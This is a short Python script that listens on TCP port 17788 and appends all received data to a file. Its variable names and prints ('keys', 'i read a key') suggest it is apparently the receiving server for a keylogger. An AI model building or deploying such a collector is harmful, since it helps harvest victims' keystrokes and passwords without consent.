import socket

con = socket.socket(2,1)
con.bind(('0.0.0.0',17788))
con.listen(-1)


def write(str):
    with open('save.txt','ab') as f:
        print('Iam writing')
        f.write(str)
        f.close()
    
while True:
    client = con.accept()[0]
    print('I connected')
    while True:
        try:
            keys = client.recv(1024)
            print('i read a key')
            write(keys)
        except:
            break